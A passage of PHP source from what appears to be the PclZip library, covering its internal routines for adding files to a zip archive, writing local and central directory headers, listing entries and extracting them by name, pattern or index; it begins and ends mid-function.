    if ($v_header_list[$i]['status'] == 'ok') {
      if (($v_result = $this->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
        fclose($v_zip_temp_fd);
        $this->privCloseFd();
        @unlink($v_zip_temp_name);
        $this->privSwapBackMagicQuotes();

        return $v_result;
      }
      $v_count++;
    }

    $this->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
  }

  $v_comment = $v_central_dir['comment'];
  if (isset($p_options[PCLZIP_OPT_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_COMMENT];
  }
  if (isset($p_options[PCLZIP_OPT_ADD_COMMENT])) {
    $v_comment = $v_comment.$p_options[PCLZIP_OPT_ADD_COMMENT];
  }
  if (isset($p_options[PCLZIP_OPT_PREPEND_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_PREPEND_COMMENT].$v_comment;
  }

  $v_size = @ftell($this->zip_fd)-$v_offset;

  if (($v_result = $this->privWriteCentralHeader($v_count+$v_central_dir['entries'], $v_size, $v_offset, $v_comment)) != 1)
  {
    unset($v_header_list);
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $this->privCloseFd();

  @fclose($v_zip_temp_fd);

  $this->privSwapBackMagicQuotes();

  @unlink($this->zipname);

  PclZipUtilRename($v_zip_temp_name, $this->zipname);

  return $v_result;
}

function privOpenFd($p_mode)
{
  $v_result=1;

  if ($this->zip_fd != 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Zip file \''.$this->zipname.'\' already open');

    return PclZip::errorCode();
  }

  if (($this->zip_fd = @fopen($this->zipname, $p_mode)) == 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in '.$p_mode.' mode');

    return PclZip::errorCode();
  }

  return $v_result;
}

function privCloseFd()
{
  $v_result=1;

  if ($this->zip_fd != 0)
    @fclose($this->zip_fd);
  $this->zip_fd = 0;

  return $v_result;
}

function privAddList($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;

  $v_header_list = array();
  if (($v_result = $this->privAddFileList($p_filedescr_list, $v_header_list, $p_options)) != 1)
  {
    return $v_result;
  }

  $v_offset = @ftell($this->zip_fd);

  for ($i=0,$v_count=0; $i<sizeof($v_header_list); $i++)
  {
    if ($v_header_list[$i]['status'] == 'ok') {
      if (($v_result = $this->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
        return $v_result;
      }
      $v_count++;
    }

    $this->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
  }

  $v_comment = '';
  if (isset($p_options[PCLZIP_OPT_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_COMMENT];
  }

  $v_size = @ftell($this->zip_fd)-$v_offset;

  if (($v_result = $this->privWriteCentralHeader($v_count, $v_size, $v_offset, $v_comment)) != 1)
  {
    unset($v_header_list);

    return $v_result;
  }

  return $v_result;
}

function privAddFileList($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_header = array();

  $v_nb = sizeof($p_result_list);

  for ($j=0; ($j<sizeof($p_filedescr_list)) && ($v_result==1); $j++) {
    $p_filedescr_list[$j]['filename']
    = PclZipUtilTranslateWinPath($p_filedescr_list[$j]['filename'], false);
    

    if ($p_filedescr_list[$j]['filename'] == "") {
      continue;
    }

    if (   ($p_filedescr_list[$j]['type'] != 'virtual_file')
        && (!file_exists($p_filedescr_list[$j]['filename']))) {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "File '".$p_filedescr_list[$j]['filename']."' does not exist");
      return PclZip::errorCode();
    }

    if (   ($p_filedescr_list[$j]['type'] == 'file')
        || ($p_filedescr_list[$j]['type'] == 'virtual_file')
        || (   ($p_filedescr_list[$j]['type'] == 'folder')
            && (   !isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH])
                || !$p_options[PCLZIP_OPT_REMOVE_ALL_PATH]))
        ) {

      $v_result = $this->privAddFile($p_filedescr_list[$j], $v_header,
                                     $p_options);
      if ($v_result != 1) {
        return $v_result;
      }

      $p_result_list[$v_nb++] = $v_header;
    }
  }

  return $v_result;
}

function privAddFile($p_filedescr, &$p_header, &$p_options)
{
  $v_result=1;
  
  $p_filename = $p_filedescr['filename'];

  if ($p_filename == "") {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid file list parameter (invalid or empty list)");

    return PclZip::errorCode();
  }


  clearstatcache();
  $p_header['version'] = 20;
  $p_header['version_extracted'] = 10;
  $p_header['flag'] = 0;
  $p_header['compression'] = 0;
  $p_header['crc'] = 0;
  $p_header['compressed_size'] = 0;
  $p_header['filename_len'] = strlen($p_filename);
  $p_header['extra_len'] = 0;
  $p_header['disk'] = 0;
  $p_header['internal'] = 0;
  $p_header['offset'] = 0;
  $p_header['filename'] = $p_filename;
  $p_header['stored_filename'] = $p_filedescr['stored_filename'];
  $p_header['extra'] = '';
  $p_header['status'] = 'ok';
  $p_header['index'] = -1;

  if ($p_filedescr['type']=='file') {
    $p_header['external'] = 0x00000000;
    $p_header['size'] = filesize($p_filename);
  }
  
  else if ($p_filedescr['type']=='folder') {
    $p_header['external'] = 0x00000010;
    $p_header['mtime'] = filemtime($p_filename);
    $p_header['size'] = filesize($p_filename);
  }
  
  else if ($p_filedescr['type'] == 'virtual_file') {
    $p_header['external'] = 0x00000000;
    $p_header['size'] = strlen($p_filedescr['content']);
  }
  

  if (isset($p_filedescr['mtime'])) {
    $p_header['mtime'] = $p_filedescr['mtime'];
  }
  else if ($p_filedescr['type'] == 'virtual_file') {
    $p_header['mtime'] = time();
  }
  else {
    $p_header['mtime'] = filemtime($p_filename);
  }

  if (isset($p_filedescr['comment'])) {
    $p_header['comment_len'] = strlen($p_filedescr['comment']);
    $p_header['comment'] = $p_filedescr['comment'];
  }
  else {
    $p_header['comment_len'] = 0;
    $p_header['comment'] = '';
  }

  if (isset($p_options[PCLZIP_CB_PRE_ADD])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_header, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_ADD](PCLZIP_CB_PRE_ADD, $v_local_header);
    if ($v_result == 0) {
      $p_header['status'] = "skipped";
      $v_result = 1;
    }

    if ($p_header['stored_filename'] != $v_local_header['stored_filename']) {
      $p_header['stored_filename'] = PclZipUtilPathReduction($v_local_header['stored_filename']);
    }
  }

  if ($p_header['stored_filename'] == "") {
    $p_header['status'] = "filtered";
  }
  
  if (strlen($p_header['stored_filename']) > 0xFF) {
    $p_header['status'] = 'filename_too_long';
  }

  if ($p_header['status'] == 'ok') {

    if ($p_filedescr['type'] == 'file') {
      if ( (!isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) 
          && (isset($p_options[PCLZIP_OPT_TEMP_FILE_ON])
              || (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
                  && ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] <= $p_header['size'])) ) ) {
        $v_result = $this->privAddFileUsingTempFile($p_filedescr, $p_header, $p_options);
        if ($v_result < PCLZIP_ERR_NO_ERROR) {
          return $v_result;
        }
      }
      
      else {

      if (($v_file = @fopen($p_filename, "rb")) == 0) {
        PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to open file '$p_filename' in binary read mode");
        return PclZip::errorCode();
      }

      $v_content = @fread($v_file, $p_header['size']);

      @fclose($v_file);

      $p_header['crc'] = @crc32($v_content);
      
      if ($p_options[PCLZIP_OPT_NO_COMPRESSION]) {
        $p_header['compressed_size'] = $p_header['size'];
        $p_header['compression'] = 0;
      }
      
      else {
        $v_content = @gzdeflate($v_content);

        $p_header['compressed_size'] = strlen($v_content);
        $p_header['compression'] = 8;
      }
      
      if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
        @fclose($v_file);
        return $v_result;
      }

      @fwrite($this->zip_fd, $v_content, $p_header['compressed_size']);

      }

    }

    else if ($p_filedescr['type'] == 'virtual_file') {
        
      $v_content = $p_filedescr['content'];

      $p_header['crc'] = @crc32($v_content);
      
      if ($p_options[PCLZIP_OPT_NO_COMPRESSION]) {
        $p_header['compressed_size'] = $p_header['size'];
        $p_header['compression'] = 0;
      }
      
      else {
        $v_content = @gzdeflate($v_content);

        $p_header['compressed_size'] = strlen($v_content);
        $p_header['compression'] = 8;
      }
      
      if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
        @fclose($v_file);
        return $v_result;
      }

      @fwrite($this->zip_fd, $v_content, $p_header['compressed_size']);
    }

    else if ($p_filedescr['type'] == 'folder') {
      if (@substr($p_header['stored_filename'], -1) != '/') {
        $p_header['stored_filename'] .= '/';
      }

      $p_header['size'] = 0;

      if (($v_result = $this->privWriteFileHeader($p_header)) != 1)
      {
        return $v_result;
      }
    }
  }

  if (isset($p_options[PCLZIP_CB_POST_ADD])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_header, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_ADD](PCLZIP_CB_POST_ADD, $v_local_header);
    if ($v_result == 0) {
      $v_result = 1;
    }

  }

  return $v_result;
}

function privAddFileUsingTempFile($p_filedescr, &$p_header, &$p_options)
{
  $v_result=PCLZIP_ERR_NO_ERROR;
  
  $p_filename = $p_filedescr['filename'];


  if (($v_file = @fopen($p_filename, "rb")) == 0) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to open file '$p_filename' in binary read mode");
    return PclZip::errorCode();
  }

  $v_gzip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.gz';
  if (($v_file_compressed = @gzopen($v_gzip_temp_name, "wb")) == 0) {
    fclose($v_file);
    PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary write mode');
    return PclZip::errorCode();
  }

  $v_size = filesize($p_filename);
  while ($v_size != 0) {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_file, $v_read_size);
    @gzputs($v_file_compressed, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  @fclose($v_file);
  @gzclose($v_file_compressed);

  if (filesize($v_gzip_temp_name) < 18) {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'gzip temporary file \''.$v_gzip_temp_name.'\' has invalid filesize - should be minimum 18 bytes');
    return PclZip::errorCode();
  }

  if (($v_file_compressed = @fopen($v_gzip_temp_name, "rb")) == 0) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }

  $v_binary_data = @fread($v_file_compressed, 10);
  $v_data_header = unpack('a1id1/a1id2/a1cm/a1flag/Vmtime/a1xfl/a1os', $v_binary_data);

  $v_data_header['os'] = bin2hex($v_data_header['os']);

  @fseek($v_file_compressed, filesize($v_gzip_temp_name)-8);
  $v_binary_data = @fread($v_file_compressed, 8);
  $v_data_footer = unpack('Vcrc/Vcompressed_size', $v_binary_data);

  $p_header['compression'] = ord($v_data_header['cm']);
  $p_header['crc'] = $v_data_footer['crc'];
  $p_header['compressed_size'] = filesize($v_gzip_temp_name)-18;

  @fclose($v_file_compressed);

  if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
    return $v_result;
  }

  if (($v_file_compressed = @fopen($v_gzip_temp_name, "rb")) == 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }

  fseek($v_file_compressed, 10);
  $v_size = $p_header['compressed_size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_file_compressed, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  @fclose($v_file_compressed);

  @unlink($v_gzip_temp_name);
  
  return $v_result;
}

function privCalculateStoredFilename(&$p_filedescr, &$p_options)
{
  $v_result=1;
  
  $p_filename = $p_filedescr['filename'];
  if (isset($p_options[PCLZIP_OPT_ADD_PATH])) {
    $p_add_dir = $p_options[PCLZIP_OPT_ADD_PATH];
  }
  else {
    $p_add_dir = '';
  }
  if (isset($p_options[PCLZIP_OPT_REMOVE_PATH])) {
    $p_remove_dir = $p_options[PCLZIP_OPT_REMOVE_PATH];
  }
  else {
    $p_remove_dir = '';
  }
  if (isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
    $p_remove_all_dir = $p_options[PCLZIP_OPT_REMOVE_ALL_PATH];
  }
  else {
    $p_remove_all_dir = 0;
  }


  if (isset($p_filedescr['new_full_name'])) {
    $v_stored_filename = PclZipUtilTranslateWinPath($p_filedescr['new_full_name']);
  }
  
  else {

    if (isset($p_filedescr['new_short_name'])) {
      $v_path_info = pathinfo($p_filename);
      $v_dir = '';
      if ($v_path_info['dirname'] != '') {
        $v_dir = $v_path_info['dirname'].'/';
      }
      $v_stored_filename = $v_dir.$p_filedescr['new_short_name'];
    }
    else {
      $v_stored_filename = $p_filename;
    }

    if ($p_remove_all_dir) {
      $v_stored_filename = basename($p_filename);
    }
    else if ($p_remove_dir != "") {
      if (substr($p_remove_dir, -1) != '/')
        $p_remove_dir .= "/";

      if (   (substr($p_filename, 0, 2) == "./")
          || (substr($p_remove_dir, 0, 2) == "./")) {
          
        if (   (substr($p_filename, 0, 2) == "./")
            && (substr($p_remove_dir, 0, 2) != "./")) {
          $p_remove_dir = "./".$p_remove_dir;
        }
        if (   (substr($p_filename, 0, 2) != "./")
            && (substr($p_remove_dir, 0, 2) == "./")) {
          $p_remove_dir = substr($p_remove_dir, 2);
        }
      }

      $v_compare = PclZipUtilPathInclusion($p_remove_dir,
                                           $v_stored_filename);
      if ($v_compare > 0) {
        if ($v_compare == 2) {
          $v_stored_filename = "";
        }
        else {
          $v_stored_filename = substr($v_stored_filename,
                                      strlen($p_remove_dir));
        }
      }
    }
    
    $v_stored_filename = PclZipUtilTranslateWinPath($v_stored_filename);
    
    if ($p_add_dir != "") {
      if (substr($p_add_dir, -1) == "/")
        $v_stored_filename = $p_add_dir.$v_stored_filename;
      else
        $v_stored_filename = $p_add_dir."/".$v_stored_filename;
    }
  }

  $v_stored_filename = PclZipUtilPathReduction($v_stored_filename);
  $p_filedescr['stored_filename'] = $v_stored_filename;
  
  return $v_result;
}

function privWriteFileHeader(&$p_header)
{
  $v_result=1;

  $p_header['offset'] = ftell($this->zip_fd);

  $v_date = getdate($p_header['mtime']);
  $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;
  $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];

  $v_binary_data = pack("VvvvvvVVVvv", 0x04034b50,
                      $p_header['version_extracted'], $p_header['flag'],
                        $p_header['compression'], $v_mtime, $v_mdate,
                        $p_header['crc'], $p_header['compressed_size'],
					  $p_header['size'],
                        strlen($p_header['stored_filename']),
					  $p_header['extra_len']);

  fputs($this->zip_fd, $v_binary_data, 30);

  if (strlen($p_header['stored_filename']) != 0)
  {
    fputs($this->zip_fd, $p_header['stored_filename'], strlen($p_header['stored_filename']));
  }
  if ($p_header['extra_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['extra'], $p_header['extra_len']);
  }

  return $v_result;
}

function privWriteCentralFileHeader(&$p_header)
{
  $v_result=1;

  $v_date = getdate($p_header['mtime']);
  $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;
  $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];


  $v_binary_data = pack("VvvvvvvVVVvvvvvVV", 0x02014b50,
                      $p_header['version'], $p_header['version_extracted'],
                        $p_header['flag'], $p_header['compression'],
					  $v_mtime, $v_mdate, $p_header['crc'],
                        $p_header['compressed_size'], $p_header['size'],
                        strlen($p_header['stored_filename']),
					  $p_header['extra_len'], $p_header['comment_len'],
                        $p_header['disk'], $p_header['internal'],
					  $p_header['external'], $p_header['offset']);

  fputs($this->zip_fd, $v_binary_data, 46);

  if (strlen($p_header['stored_filename']) != 0)
  {
    fputs($this->zip_fd, $p_header['stored_filename'], strlen($p_header['stored_filename']));
  }
  if ($p_header['extra_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['extra'], $p_header['extra_len']);
  }
  if ($p_header['comment_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['comment'], $p_header['comment_len']);
  }

  return $v_result;
}

function privWriteCentralHeader($p_nb_entries, $p_size, $p_offset, $p_comment)
{
  $v_result=1;

  $v_binary_data = pack("VvvvvVVv", 0x06054b50, 0, 0, $p_nb_entries,
                      $p_nb_entries, $p_size,
					  $p_offset, strlen($p_comment));

  fputs($this->zip_fd, $v_binary_data, 22);

  if (strlen($p_comment) != 0)
  {
    fputs($this->zip_fd, $p_comment, strlen($p_comment));
  }

  return $v_result;
}

function privList(&$p_list)
{
  $v_result=1;

  $this->privDisableMagicQuotes();

  if (($this->zip_fd = @fopen($this->zipname, 'rb')) == 0)
  {
    $this->privSwapBackMagicQuotes();
    
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in binary read mode');

    return PclZip::errorCode();
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  @rewind($this->zip_fd);
  if (@fseek($this->zip_fd, $v_central_dir['offset']))
  {
    $this->privSwapBackMagicQuotes();

    PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

    return PclZip::errorCode();
  }

  for ($i=0; $i<$v_central_dir['entries']; $i++)
  {
    if (($v_result = $this->privReadCentralFileHeader($v_header)) != 1)
    {
      $this->privSwapBackMagicQuotes();
      return $v_result;
    }
    $v_header['index'] = $i;

    $this->privConvertHeader2FileInfo($v_header, $p_list[$i]);
    unset($v_header);
  }

  $this->privCloseFd();

  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privConvertHeader2FileInfo($p_header, &$p_info)
{
  $v_result=1;

  $v_temp_path = PclZipUtilPathReduction($p_header['filename']);
  $p_info['filename'] = $v_temp_path;
  $v_temp_path = PclZipUtilPathReduction($p_header['stored_filename']);
  $p_info['stored_filename'] = $v_temp_path;
  $p_info['size'] = $p_header['size'];
  $p_info['compressed_size'] = $p_header['compressed_size'];
  $p_info['mtime'] = $p_header['mtime'];
  $p_info['comment'] = $p_header['comment'];
  $p_info['folder'] = (($p_header['external']&0x00000010)==0x00000010);
  $p_info['index'] = $p_header['index'];
  $p_info['status'] = $p_header['status'];
  $p_info['crc'] = $p_header['crc'];

  return $v_result;
}

function privExtractByRule(&$p_file_list, $p_path, $p_remove_path, $p_remove_all_path, &$p_options)
{
  $v_result=1;

  $this->privDisableMagicQuotes();

  if (   ($p_path == "")
    || (   (substr($p_path, 0, 1) != "/")
	    && (substr($p_path, 0, 3) != "../")
		&& (substr($p_path,1,2)!=":/")))
    $p_path = "./".$p_path;

  if (($p_path != "./") && ($p_path != "/"))
  {
    while (substr($p_path, -1) == "/")
    {
      $p_path = substr($p_path, 0, strlen($p_path)-1);
    }
  }

  if (($p_remove_path != "") && (substr($p_remove_path, -1) != '/'))
  {
    $p_remove_path .= '/';
  }
  $p_remove_path_size = strlen($p_remove_path);

  if (($v_result = $this->privOpenFd('rb')) != 1)
  {
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_pos_entry = $v_central_dir['offset'];

  $j_start = 0;
  for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++)
  {

    @rewind($this->zip_fd);
    if (@fseek($this->zip_fd, $v_pos_entry))
    {
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();

      PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

      return PclZip::errorCode();
    }

    $v_header = array();
    if (($v_result = $this->privReadCentralFileHeader($v_header)) != 1)
    {
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();

      return $v_result;
    }

    $v_header['index'] = $i;

    $v_pos_entry = ftell($this->zip_fd);

    $v_extract = false;

    if (   (isset($p_options[PCLZIP_OPT_BY_NAME]))
        && ($p_options[PCLZIP_OPT_BY_NAME] != 0)) {

        for ($j=0; ($j<sizeof($p_options[PCLZIP_OPT_BY_NAME])) && (!$v_extract); $j++) {

            if (substr($p_options[PCLZIP_OPT_BY_NAME][$j], -1) == "/") {

                if (   (strlen($v_header['stored_filename']) > strlen($p_options[PCLZIP_OPT_BY_NAME][$j]))
                    && (substr($v_header['stored_filename'], 0, strlen($p_options[PCLZIP_OPT_BY_NAME][$j])) == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_extract = true;
                }
            }
            elseif ($v_header['stored_filename'] == $p_options[PCLZIP_OPT_BY_NAME][$j]) {
                $v_extract = true;
            }
        }
    }


    else if (   (isset($p_options[PCLZIP_OPT_BY_PREG]))
             && ($p_options[PCLZIP_OPT_BY_PREG] != "")) {

        if (preg_match($p_options[PCLZIP_OPT_BY_PREG], $v_header['stored_filename'])) {
            $v_extract = true;
        }
    }

    else if (   (isset($p_options[PCLZIP_OPT_BY_INDEX]))
             && ($p_options[PCLZIP_OPT_BY_INDEX] != 0)) {
        
        for ($j=$j_start; ($j<sizeof($p_options[PCLZIP_OPT_BY_INDEX])) && (!$v_extract); $j++) {

            if (($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['start']) && ($i<=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end'])) {
                $v_extract = true;
            }
            if ($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']) {
                $j_start = $j+1;
            }

            if ($p_options[PCLZIP_OPT_BY_INDEX][$j]['start']>$i) {
                break;
            }
        }
    }

    else {
        $v_extract = true;
    }

  if (   ($v_extract)
      && (   ($v_header['compression'] != 8)
	      && ($v_header['compression'] != 0))) {
        $v_header['status'] = 'unsupported_compression';

        if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	      && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

            $this->privSwapBackMagicQuotes();
            
            PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_COMPRESSION,
		                       "Filename '".$v_header['stored_filename']."' is "
			  	    	  	   ."compressed by an unsupported compression "
			  	    	  	   ."method (".$v_header['compression'].") ");

            return PclZip::errorCode();
	  }
  }
  
  if (($v_extract) && (($v_header['flag'] & 1) == 1)) {
        $v_header['status'] = 'unsupported_encryption';

        if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	      && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

            $this->privSwapBackMagicQuotes();

            PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_ENCRYPTION,
		                       "Unsupported encryption for "
			  	    	  	   ." filename '".$v_header['stored_filename']
							   ."'");

            return PclZip::errorCode();
	  }
  }

    if (($v_extract) && ($v_header['status'] != 'ok')) {
        $v_result = $this->privConvertHeader2FileInfo($v_header,
	                                        $p_file_list[$v_nb_extracted++]);
        if ($v_result != 1) {
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();
            return $v_result;
        }

        $v_extract = false;
    }
    
    if ($v_extract)
    {

      @rewind($this->zip_fd);
      if (@fseek($this->zip_fd, $v_header['offset']))
      {
        $this->privCloseFd();

        $this->privSwapBackMagicQuotes();

        PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

        return PclZip::errorCode();
      }

      if ($p_options[PCLZIP_OPT_EXTRACT_AS_STRING]) {

        $v_string = '';

        $v_result1 = $this->privExtractFileAsString($v_header, $v_string, $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted])) != 1)
        {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();

          return $v_result;
        }

        $p_file_list[$v_nb_extracted]['content'] = $v_string;

        $v_nb_extracted++;
        
        if ($v_result1 == 2) {
        	break;
        }
      }
      elseif (   (isset($p_options[PCLZIP_OPT_EXTRACT_IN_OUTPUT]))
	        && ($p_options[PCLZIP_OPT_EXTRACT_IN_OUTPUT])) {
        $v_result1 = $this->privExtractFileInOutput($v_header, $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted++])) != 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result;
        }

        if ($v_result1 == 2) {
        	break;
        }
      }
      else {
        $v_result1 = $this->privExtractFile($v_header,
	                                      $p_path, $p_remove_path,
										  $p_remove_all_path,
										  $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted++])) != 1)
        {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();

          return $v_result;
        }

        if ($v_result1 == 2) {
        	break;
        }
      }
    }
  }

  $this->privCloseFd();
  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privExtractFile(&$p_entry, $p_path, $p_remove_path, $p_remove_all_path, &$p_options)
{
  $v_result=1;

  if (($v_result = $this->privReadFileHeader($v_header)) != 1)
  {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if ($p_remove_all_path == true) {
      if (($p_entry['external']&0x00000010)==0x00000010) {

          $p_entry['status'] = "filtered";

          return $v_result;
      }

      $p_entry['filename'] = basename($p_entry['filename']);
  }

  else if ($p_remove_path != "")
  {
    if (PclZipUtilPathInclusion($p_remove_path, $p_entry['filename']) == 2)
    {

      $p_entry['status'] = "filtered";

      return $v_result;
    }

    $p_remove_path_size = strlen($p_remove_path);
    if (substr($p_entry['filename'], 0, $p_remove_path_size) == $p_remove_path)
    {

      $p_entry['filename'] = substr($p_entry['filename'], $p_remove_path_size);

    }
  }

  if ($p_path != '') {
    $p_entry['filename'] = $p_path."/".$p_entry['filename'];
  }
  
  if (isset($p_options[PCLZIP_OPT_EXTRACT_DIR_RESTRICTION])) {
    $v_inclusion
    = PclZipUtilPathInclusion($p_options[PCLZIP_OPT_EXTRACT_DIR_RESTRICTION],
                              $p_entry['filename']); 
    if ($v_inclusion == 0) {

      PclZip::privErrorLog(PCLZIP_ERR_DIRECTORY_RESTRICTION,
		                     "Filename '".$p_entry['filename']."' is "
							 ."outside PCLZIP_OPT_EXTRACT_DIR_RESTRICTION");

      return PclZip::errorCode();
    }
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }
    
    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

  if (file_exists($p_entry['filename']))
  {

    if (is_dir($p_entry['filename']))
    {

      $p_entry['status'] = "already_a_directory";
      
      if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	    && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

          PclZip::privErrorLog(PCLZIP_ERR_ALREADY_A_DIRECTORY,
		                     "Filename '".$p_entry['filename']."' is "
							 ."already used by an existing directory");

          return PclZip::errorCode();
	    }
    }
    else if (!is_writeable($p_entry['filename']))
    {

      $p_entry['status'] = "write_protected";

      if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	    && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

          PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL,
		                     "Filename '".$p_entry['filename']."' exists "
							 ."and is write protected");

          return PclZip::errorCode();
	    }
    }

    else if (filemtime($p_entry['filename']) > $p_entry['mtime'])
    {
      if (   (isset($p_options[PCLZIP_OPT_REPLACE_NEWER]))
	    && ($p_options[PCLZIP_OPT_REPLACE_NEWER]===true)) {
  	  }
	    else {
          $p_entry['status'] = "newer_exist";

          if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	        && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

              PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL,
		             "Newer version of '".$p_entry['filename']."' exists "
				    ."and option PCLZIP_OPT_REPLACE_NEWER is not selected");

              return PclZip::errorCode();
	      }
	    }
    }
    else {
    }
  }

  else {
    if ((($p_entry['external']&0x00000010)==0x00000010) || (substr($p_entry['filename'], -1) == '/'))
